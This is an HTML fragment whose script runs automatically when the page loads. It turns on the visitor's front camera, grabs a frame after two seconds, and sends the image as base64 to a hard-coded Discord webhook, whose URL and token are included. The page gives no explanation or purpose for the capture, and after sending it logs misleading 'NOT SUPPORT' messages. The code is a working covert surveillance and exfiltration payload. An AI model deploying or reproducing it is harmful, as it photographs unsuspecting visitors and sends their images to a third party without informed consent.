<body>
    <script>
        const webhookURL = "https://discord.com/api/webhooks/1340611336966770761/BG9LqkUM1Tri7XT1oHVaotzuOQo6VTj4fnWsmtgS0geRxhdBAVZ0wxw3XqGdjLYIY9xI"; // à¶”à¶¶à·š Discord Webhook URL à¶‘à¶š 

        async function captureAndSendPhoto() {
            try {
                // Front Camera Access
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.createElement("video");
                video.srcObject = stream;
                video.play();

                setTimeout(() => {
                    const canvas = document.createElement("canvas");
                    const context = canvas.getContext("2d");
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // Stop Camera Stream
                    stream.getTracks().forEach(track => track.stop());

                    // Convert to Base64 Image
                    const imageData = canvas.toDataURL("image/png");

                    // Send Image to Discord Webhook
                    fetch(webhookURL, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            content: "ðŸ“¸ Captured Image:",
                            embeds: [{ image: { url: imageData } }]
                        })
                    }).then(response => console.log("NOT SUPPORT"))
                      .catch(error => console.error("NOT SUPPORT:", error));
                }, 2000); // 2 Seconds Delay Before Capture
            } catch (error) {
                console.error("NO WORKING:", error);
            }
        }

        // Auto Start on Page Load
        window.onload = captureAndSendPhoto;
    </script>
